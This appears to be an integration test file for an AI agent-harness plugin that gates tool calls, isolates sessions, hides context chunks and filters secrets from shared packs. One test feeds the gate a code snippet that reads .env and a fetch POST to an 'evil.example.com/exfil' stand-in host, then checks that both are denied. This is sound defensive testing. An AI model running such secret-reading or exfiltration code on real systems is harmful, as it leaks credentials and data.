import { describe, it, beforeEach, afterEach } from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, mkdirSync, rmSync, writeFileSync, readdirSync, readFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { apply, name as pluginName, inject as pluginInject, resolveSessionId } from '../jev-harness-loop/index.mjs'

/**
 * Minimal mock Cordis/DSH plugin context supporting:
 * - ctx.on(event, handler)
 * - ctx.tools.register(toolDef)
 * - Waterfall emission for system-prompt/assemble, tools/pre-execute, tools/post-execute
 * - Direct emission for session/event, agent/disposed
 */
function createMockCtx() {
  const listeners = new Map()
  const registeredTools = new Map()

  const ctx = {
    on(event, handler) {
      if (!listeners.has(event)) listeners.set(event, [])
      listeners.get(event).push(handler)
    },
    tools: {
      register(def) {
        registeredTools.set(def.name, def)
      },
    },
  }

  function emitSessionEvent(session, event) {
    for (const fn of listeners.get('session/event') || []) {
      fn(session, event)
    }
  }

  function emitDisposed(payload) {
    for (const fn of listeners.get('agent/disposed') || []) {
      fn(payload)
    }
  }

  async function runAssemble(base, context) {
    const handlers = listeners.get('system-prompt/assemble') || []
    let idx = 0
    const next = async () => {
      if (idx >= handlers.length) return base
      const fn = handlers[idx++]
      return fn({}, context, next)
    }
    return next()
  }

  async function runPreExecute(exec) {
    const handlers = listeners.get('tools/pre-execute') || []
    let idx = 0
    const next = async () => {
      if (idx >= handlers.length) return { kind: 'allow' }
      const fn = handlers[idx++]
      return fn(exec, next)
    }
    return next()
  }

  async function runPostExecute(exec, result) {
    const handlers = listeners.get('tools/post-execute') || []
    let idx = 0
    const next = async () => {
      if (idx >= handlers.length) return result
      const fn = handlers[idx++]
      return fn(exec, result, next)
    }
    return next()
  }

  return {
    ctx,
    registeredTools,
    emitSessionEvent,
    emitDisposed,
    runAssemble,
    runPreExecute,
    runPostExecute,
  }
}

function makeJevBase(cwd, { approvalDisabled = true, filePolicy = 'danger-full-access' } = {}) {
  const escapedCwd = cwd.replace(/\\/g, '\\\\')
  return {
    sections: [
      {
        name: 'persona',
        text: 'You are an AI agent powered by DeepSeek Harness, running as a JeV harness — the decision layer beside the model.\n# JeV engineering contract',
      },
    ],
    contexts: [
      {
        name: 'session-env',
        text: [
          `Current working directory: "${escapedCwd}".`,
          `Current DSH file policy: ${filePolicy}.`,
          approvalDisabled ? 'Approval prompts are disabled in this session.' : 'Approval prompts are enabled.',
        ].join('\n'),
      },
    ],
  }
}

function makePtcBase(cwd) {
  return {
    sections: [
      {
        name: 'persona',
        text: 'You are a standard DeepSeek Harness coding assistant (PTC preset).',
      },
    ],
    contexts: [
      {
        name: 'session-env',
        text: `Current working directory: "${cwd}".\nCurrent DSH file policy: danger-full-access.`,
      },
    ],
  }
}

function createMockFetch(responder) {
  const calls = []
  const fetchImpl = async (url, init) => {
    const body = JSON.parse(init.body)
    calls.push({ url, headers: init.headers, body })
    const payload = await responder(body, calls.length)
    return {
      ok: true,
      status: 200,
      headers: { get: (k) => (k.toLowerCase() === 'x-typesafe-request-id' ? `req-${calls.length}` : null) },
      async text() {
        return JSON.stringify(payload)
      },
    }
  }
  return { fetchImpl, calls }
}

describe('jev-harness-loop v2 end-to-end integration', () => {
  let tmpDir
  let telemetryDir

  beforeEach(() => {
    tmpDir = mkdtempSync(join(tmpdir(), 'jev-loop-int-'))
    telemetryDir = join(tmpDir, '.telemetry')
  })

  afterEach(() => {
    if (tmpDir) rmSync(tmpDir, { recursive: true, force: true })
  })

  it('exports expected plugin metadata and registers jev_chunk_read & jev_retrieval_pack', () => {
    assert.equal(pluginName, 'jev-harness-loop')
    assert.deepEqual(pluginInject, ['tools'])
    assert.equal(resolveSessionId({ agent: { session: { id: 's-1' } } }, 'exec'), 's-1')
    assert.equal(resolveSessionId({ id: 'call-99', session: { id: 's-2' } }, 'exec'), 's-2')

    const harness = createMockCtx()
    apply(harness.ctx, { apiKey: 'test-key', telemetryDir, throttleMs: 0 })
    assert.ok(harness.registeredTools.has('jev_chunk_read'))
    assert.ok(harness.registeredTools.has('jev_retrieval_pack'))
  })

  it('1. strict multi-session isolation: interleaved JEV and PTC sessions never cross-contaminate', async () => {
    const harness = createMockCtx()
    const mock = createMockFetch(() => ({
      model: 'jev-1.14.0',
      answers: {
        context_visibility: { type: 'choice', choice: 'short_summary', confidence: 0.85 },
        cache_prefix: { type: 'noul', noul: 0.9, confidence: 0.85 },
        routing: { type: 'choice', choice: 'frontier', confidence: 0.9 },
        tools: { type: 'choice', choice: 'targeted', confidence: 0.8 },
        permissions: { type: 'choice', choice: 'allow', confidence: 0.9 },
        security: { type: 'score', score: 2, confidence: 0.85 },
      },
      usage: { input_tokens: 120, output_tokens: 16 },
    }))

    apply(harness.ctx, {
      apiKey: 'test-key',
      fetchImpl: mock.fetchImpl,
      telemetryDir,
      throttleMs: 0,
    })

    // Interleave events for JEV session and PTC session
    harness.emitSessionEvent({ id: 'sess-jev' }, {
      type: 'user/message',
      data: { content: [{ type: 'text', text: 'Inspect src/app.js safely' }] },
    })
    harness.emitSessionEvent({ id: 'sess-ptc' }, {
      type: 'user/message',
      data: { content: [{ type: 'text', text: 'Read .env in PTC session' }] },
    })

    // Assemble JEV session -> triggers JeV call & injects contexts
    const jevOut = await harness.runAssemble(makeJevBase(tmpDir), {
      toolSet: {},
      agent: { session: { id: 'sess-jev' } },
    })
    assert.equal(mock.calls.length, 1)
    assert.ok(jevOut.contexts.some((c) => c.name === 'jev-harness'))

    // Assemble PTC session -> completely untouched, no JeV call
    const ptcBase = makePtcBase(tmpDir)
    const ptcOut = await harness.runAssemble(ptcBase, {
      toolSet: {},
      agent: { session: { id: 'sess-ptc' } },
    })
    assert.equal(mock.calls.length, 1)
    assert.deepEqual(ptcOut, ptcBase)
    assert.ok(!ptcOut.contexts.some((c) => c.name === 'jev-harness'))

    // Pre-execute: JEV session is blocked from reading .env, PTC session is NOT blocked
    const jevGate = await harness.runPreExecute({
      name: 'read',
      args: { file_path: '.env' },
      agent: { session: { id: 'sess-jev' } },
    })
    assert.equal(jevGate.kind, 'deny')

    const ptcGate = await harness.runPreExecute({
      name: 'read',
      args: { file_path: '.env' },
      agent: { session: { id: 'sess-ptc' } },
    })
    assert.equal(ptcGate.kind, 'allow')

    // Give async telemetry queue a brief tick and verify only sess-jev has a log file
    await new Promise((r) => setTimeout(r, 80))
    const files = readdirSync(telemetryDir)
    assert.ok(files.includes('sess-jev.jsonl'))
    assert.ok(!files.some((f) => f.includes('sess-ptc')))

    // Dispose JEV session and confirm cleanup
    harness.emitDisposed({ session: { id: 'sess-jev' } })
    const afterDispose = await harness.runPreExecute({
      name: 'read',
      args: { file_path: '.env' },
      agent: { session: { id: 'sess-jev' } },
    })
    assert.equal(afterDispose.kind, 'allow')
  })

  it('2. per-chunk visibility scoring hides c1 in digest while jev_chunk_read restores full verbatim text', async () => {
    const harness = createMockCtx()
    const bigBody = Array.from({ length: 40 }, (_, i) => `line ${i + 1}: important match token_${i + 1}`).join('\n')

    const mock = createMockFetch((reqBody) => {
      // Verify per-chunk visibility question was batched
      assert.ok(reqBody.questions.chunk_vis_c1, 'expected chunk_vis_c1 question in batched payload')
      return {
        model: 'jev-1.14.0',
        answers: {
          context_visibility: { type: 'choice', choice: 'hide', confidence: 0.9 },
          chunk_vis_c1: { type: 'choice', choice: 'hide', confidence: 0.92 },
          cache_prefix: { type: 'noul', noul: 0.85, confidence: 0.8 },
          routing: { type: 'choice', choice: 'frontier', confidence: 0.9 },
          tools: { type: 'choice', choice: 'targeted', confidence: 0.85 },
          permissions: { type: 'choice', choice: 'allow', confidence: 0.95 },
          security: { type: 'score', score: 1, confidence: 0.9 },
        },
      }
    })

    apply(harness.ctx, {
      apiKey: 'test-key',
      fetchImpl: mock.fetchImpl,
      telemetryDir,
      throttleMs: 0,
    })

    harness.emitSessionEvent({ id: 'sess-vis' }, {
      type: 'user/message',
      data: { content: [{ type: 'text', text: 'Search references in src/core.js' }] },
    })
    harness.emitSessionEvent({ id: 'sess-vis' }, {
      type: 'tool/result',
      data: {
        name: 'grep',
        source: 'src/core.js',
        message: { content: [{ type: 'text', text: bigBody }] },
      },
    })

    const out = await harness.runAssemble(makeJevBase(tmpDir), {
      toolSet: {},
      agent: { session: { id: 'sess-vis' } },
    })

    // Decision header itself must still be injected even when context_visibility === 'hide'
    const decCtx = out.contexts.find((c) => c.name === 'jev-harness')
    assert.ok(decCtx, 'decision header must not be hidden when context_visibility=hide')
    assert.match(decCtx.text, /context_visibility=hide\(high\)/)

    // Digest must report c1 as hidden and NOT inline the hidden body
    const chunkCtx = out.contexts.find((c) => c.name === 'jev-chunks')
    assert.ok(chunkCtx, 'jev-chunks digest must be injected')
    assert.match(chunkCtx.text, /Hidden \(recallable via jev_chunk_read, not deleted\): 1 \[c1\]/)
    assert.ok(!chunkCtx.text.includes('important match token_25'))

    // Restore c1 via registered jev_chunk_read tool
    const chunkReadTool = harness.registeredTools.get('jev_chunk_read')
    const restored = await chunkReadTool.execute(
      { chunk_id: 'c1', level: 'full' },
      { agent: { session: { id: 'sess-vis' } } },
    )
    assert.equal(restored.id, 'c1')
    assert.equal(restored.visibility, 'hide')
    assert.equal(restored.text, bigBody)
  })

  it('3. KV-cache stability freezes jev-harness block byte-for-byte across jittering confidences', async () => {
    const harness = createMockCtx()
    let step = 0
    const mock = createMockFetch(() => {
      step += 1
      // Same discrete decisions, jittering continuous confidence numbers
      // Even across bucket boundaries on step 2, reuse=true + same signature freezes exact bytes
      const conf = step === 1 ? 0.81 : 0.52
      return {
        model: 'jev-1.14.0',
        answers: {
          context_visibility: { type: 'choice', choice: 'short_summary', confidence: conf },
          cache_prefix: { type: 'noul', noul: step === 1 ? 0.88 : 0.76, confidence: conf },
          routing: { type: 'choice', choice: 'frontier', confidence: conf },
          tools: { type: 'choice', choice: 'targeted', confidence: conf },
          permissions: { type: 'choice', choice: 'allow', confidence: conf },
          security: { type: 'score', score: 1, confidence: conf },
        },
      }
    })

    apply(harness.ctx, {
      apiKey: 'test-key',
      fetchImpl: mock.fetchImpl,
      telemetryDir,
      throttleMs: 0,
    })

    const out1 = await harness.runAssemble(makeJevBase(tmpDir), {
      toolSet: {},
      agent: { session: { id: 'sess-cache' } },
    })
    const out2 = await harness.runAssemble(makeJevBase(tmpDir), {
      toolSet: {},
      agent: { session: { id: 'sess-cache' } },
    })

    assert.equal(mock.calls.length, 2)
    const text1 = out1.contexts.find((c) => c.name === 'jev-harness')?.text
    const text2 = out2.contexts.find((c) => c.name === 'jev-harness')?.text
    assert.ok(text1 && text2)
    assert.equal(text1, text2, 'frozen decision text must be byte-for-byte identical')
    // Ensure no raw percentage digits appear in header
    assert.doesNotMatch(text1, /\(\d+\)/)
    assert.match(text1, /\((?:low|med|high)\)/)
  })

  it('4. conditional rules (§VIII) load FOOTGUNS.md and .jev/rules/ui.md only when activePaths match', async () => {
    mkdirSync(join(tmpDir, 'sub'), { recursive: true })
    mkdirSync(join(tmpDir, '.jev', 'rules'), { recursive: true })
    writeFileSync(join(tmpDir, 'sub', 'FOOTGUNS.md'), 'Always call dispose() on native handles in sub/.', 'utf8')
    writeFileSync(
      join(tmpDir, '.jev', 'rules', 'ui.md'),
      ['---', 'name: ui-guide', 'paths:', '  - "sub/**/*.tsx"', '---', 'Use design tokens for all sub UI components.'].join('\n'),
      'utf8',
    )

    const harness = createMockCtx()
    const mock = createMockFetch(() => ({
      model: 'jev-1.14.0',
      answers: {
        context_visibility: { type: 'choice', choice: 'short_summary', confidence: 0.8 },
        cache_prefix: { type: 'noul', noul: 0.4, confidence: 0.7 },
        routing: { type: 'choice', choice: 'frontier', confidence: 0.8 },
        tools: { type: 'choice', choice: 'targeted', confidence: 0.8 },
        permissions: { type: 'choice', choice: 'allow', confidence: 0.9 },
        security: { type: 'score', score: 1, confidence: 0.8 },
      },
    }))

    apply(harness.ctx, {
      apiKey: 'test-key',
      fetchImpl: mock.fetchImpl,
      telemetryDir,
      throttleMs: 0,
    })

    // Step 1: unrelated path -> no conditional rules injected
    harness.emitSessionEvent({ id: 'sess-rules' }, {
      type: 'user/message',
      data: { content: [{ type: 'text', text: 'Inspect README.md' }] },
    })
    const outMiss = await harness.runAssemble(makeJevBase(tmpDir), {
      toolSet: {},
      agent: { session: { id: 'sess-rules' } },
    })
    assert.equal(outMiss.contexts.find((c) => c.name === 'jev-conditional-rules'), undefined)

    // Step 2: activePath matches sub/Button.tsx -> both FOOTGUNS.md and .jev/rules/ui.md injected
    harness.emitSessionEvent({ id: 'sess-rules' }, {
      type: 'user/message',
      data: { content: [{ type: 'text', text: 'Update sub/Button.tsx styling' }] },
    })
    const outHit = await harness.runAssemble(makeJevBase(tmpDir), {
      toolSet: {},
      agent: { session: { id: 'sess-rules' } },
    })
    const rulesCtx = outHit.contexts.find((c) => c.name === 'jev-conditional-rules')
    assert.ok(rulesCtx, 'expected jev-conditional-rules context when activePaths match')
    assert.match(rulesCtx.text, /Always call dispose\(\) on native handles/)
    assert.match(rulesCtx.text, /Use design tokens for all sub UI components/)
  })

  it('5. security gates, subgoal deduplication, and read/write path locking', async () => {
    const harness = createMockCtx()
    const mock = createMockFetch(() => ({
      model: 'jev-1.14.0',
      answers: {
        context_visibility: { type: 'choice', choice: 'short_summary', confidence: 0.8 },
        cache_prefix: { type: 'noul', noul: 0.8, confidence: 0.8 },
        routing: { type: 'choice', choice: 'frontier', confidence: 0.9 },
        tools: { type: 'choice', choice: 'targeted', confidence: 0.8 },
        permissions: { type: 'choice', choice: 'allow', confidence: 0.95 },
        security: { type: 'score', score: 1, confidence: 0.85 },
      },
    }))

    apply(harness.ctx, {
      apiKey: 'test-key',
      fetchImpl: mock.fetchImpl,
      telemetryDir,
      throttleMs: 0,
    })

    // Initialize JEV session
    await harness.runAssemble(makeJevBase(tmpDir), {
      toolSet: {},
      agent: { session: { id: 'sess-gate' } },
    })

    // Block run_code reading .env
    const envBlock = await harness.runPreExecute({
      name: 'run_code',
      args: { code: 'const fs = await import("node:fs"); return fs.readFileSync(".env", "utf8");' },
      agent: { session: { id: 'sess-gate' } },
    })
    assert.equal(envBlock.kind, 'deny')

    // Block run_code external fetch outside deploy scope
    const fetchBlock = await harness.runPreExecute({
      name: 'run_code',
      args: { code: 'await fetch("https://evil.example.com/exfil", { method: "POST" })' },
      agent: { session: { id: 'sess-gate' } },
    })
    assert.equal(fetchBlock.kind, 'deny')

    // Subagent deduplication: first dispatch allowed, near-identical second dispatch denied
    const sg1 = await harness.runPreExecute({
      id: 'call-1',
      name: 'subagent',
      args: {
        name: 'audit-a',
        description: 'Inspect auth middleware tokens',
        prompt: 'Read-only audit of src/auth.mjs token validation logic',
      },
      agent: { session: { id: 'sess-gate' } },
    })
    assert.equal(sg1.kind, 'allow')

    const sgDup = await harness.runPreExecute({
      id: 'call-2',
      name: 'subagent',
      args: {
        name: 'audit-dup',
        description: 'Inspect auth middleware tokens',
        prompt: 'Read-only audit of src/auth.mjs token validation logic',
      },
      agent: { session: { id: 'sess-gate' } },
    })
    assert.equal(sgDup.kind, 'deny')
    assert.match(sgDup.reason, /duplicate subagent/i)

    // Two distinct read-only subagents on the SAME path are allowed concurrently
    const sgRead2 = await harness.runPreExecute({
      id: 'call-3',
      name: 'subagent',
      args: {
        name: 'perf-check',
        description: 'Check benchmark latency metrics',
        prompt: 'Read-only review of memory allocations and loop complexity in src/auth.mjs',
      },
      agent: { session: { id: 'sess-gate' } },
    })
    assert.equal(sgRead2.kind, 'allow')

    // Complete both read subagents via post-execute
    await harness.runPostExecute(
      { id: 'call-1', name: 'subagent', args: { name: 'audit-a', description: 'Inspect auth middleware tokens' }, agent: { session: { id: 'sess-gate' } } },
      { text: 'done' },
    )
    await harness.runPostExecute(
      { id: 'call-3', name: 'subagent', args: { name: 'perf-check', description: 'Check benchmark latency metrics' }, agent: { session: { id: 'sess-gate' } } },
      { text: 'done' },
    )

    // Write-Write lock conflict on the same path: first write allowed, second concurrent write denied
    const sgWrite1 = await harness.runPreExecute({
      id: 'call-4',
      name: 'subagent',
      args: {
        name: 'writer-1',
        description: 'Refactor error handling',
        prompt: 'Modify src/router.mjs to emit structured HTTP error objects',
      },
      agent: { session: { id: 'sess-gate' } },
    })
    assert.equal(sgWrite1.kind, 'allow')

    const sgWrite2 = await harness.runPreExecute({
      id: 'call-5',
      name: 'subagent',
      args: {
        name: 'writer-2',
        description: 'Add OpenTelemetry spans',
        prompt: 'Edit src/router.mjs to wrap route dispatchers with tracing hooks',
      },
      agent: { session: { id: 'sess-gate' } },
    })
    assert.equal(sgWrite2.kind, 'deny')
    assert.match(sgWrite2.reason, /lock conflict/i)

    // After writer-1 completes, writer-2 can proceed
    await harness.runPostExecute(
      { id: 'call-4', name: 'subagent', args: { name: 'writer-1', description: 'Refactor error handling' }, agent: { session: { id: 'sess-gate' } } },
      { text: 'refactored' },
    )
    const sgWrite2Retry = await harness.runPreExecute({
      id: 'call-6',
      name: 'subagent',
      args: {
        name: 'writer-2',
        description: 'Add OpenTelemetry spans',
        prompt: 'Edit src/router.mjs to wrap route dispatchers with tracing hooks',
      },
      agent: { session: { id: 'sess-gate' } },
    })
    assert.equal(sgWrite2Retry.kind, 'allow')

    // Confirm gate events were persisted to JSONL telemetry
    await new Promise((r) => setTimeout(r, 80))
    const logRaw = readFileSync(join(telemetryDir, 'sess-gate.jsonl'), 'utf8')
    assert.match(logRaw, /"type":"gate"/)
    assert.match(logRaw, /"ruleId":"ptc-secret-access"/)
    assert.match(logRaw, /"ruleId":"subgoal-write-lock-conflict"/)
  })

  it('6. jev_retrieval_pack exports shared read-only pack and excludes sensitive/secret chunks at max_sensitivity=internal', async () => {
    const harness = createMockCtx()
    apply(harness.ctx, {
      apiKey: 'test-key',
      telemetryDir,
      throttleMs: 0,
    })

    // Public chunk
    harness.emitSessionEvent({ id: 'sess-pack' }, {
      type: 'tool/result',
      data: {
        name: 'read',
        source: 'README.md',
        message: { content: [{ type: 'text', text: '# Project README\nPublic architecture docs.' }] },
      },
    })
    // Internal chunk
    harness.emitSessionEvent({ id: 'sess-pack' }, {
      type: 'tool/result',
      data: {
        name: 'read',
        source: 'src/index.mjs',
        message: { content: [{ type: 'text', text: 'export function boot() { return true }' }] },
      },
    })
    // Sensitive chunk (source matches "token")
    harness.emitSessionEvent({ id: 'sess-pack' }, {
      type: 'tool/result',
      data: {
        name: 'read',
        source: 'config/token-map.json',
        message: { content: [{ type: 'text', text: '{"refreshHint":"sensitive-session-meta"}' }] },
      },
    })
    // Secret chunk (source matches ".env" and secret key content)
    harness.emitSessionEvent({ id: 'sess-pack' }, {
      type: 'tool/result',
      data: {
        name: 'read',
        source: '.env.local',
        message: { content: [{ type: 'text', text: 'MAGPIE_GATEWAY_KEY=dummy-test-fixture-value' }] },
      },
    })

    const packTool = harness.registeredTools.get('jev_retrieval_pack')
    const pack = await packTool.execute(
      { max_sensitivity: 'internal', max_chars: 4000 },
      { agent: { session: { id: 'sess-pack' } } },
    )

    assert.equal(pack.readOnly, true)
    assert.equal(pack.maxSensitivity, 'internal')
    assert.equal(pack.totalChunks, 4)
    assert.equal(pack.excludedBySensitivity, 2)
    assert.equal(pack.includedCount, 2)

    const sources = pack.chunks.map((c) => c.source)
    assert.ok(sources.includes('README.md'))
    assert.ok(sources.includes('src/index.mjs'))
    assert.ok(!sources.includes('config/token-map.json'))
    assert.ok(!sources.includes('.env.local'))
    assert.ok(!pack.rendered.includes('dummy-test-fixture-value'))
    assert.ok(!pack.rendered.includes('sensitive-session-meta'))
  })
})
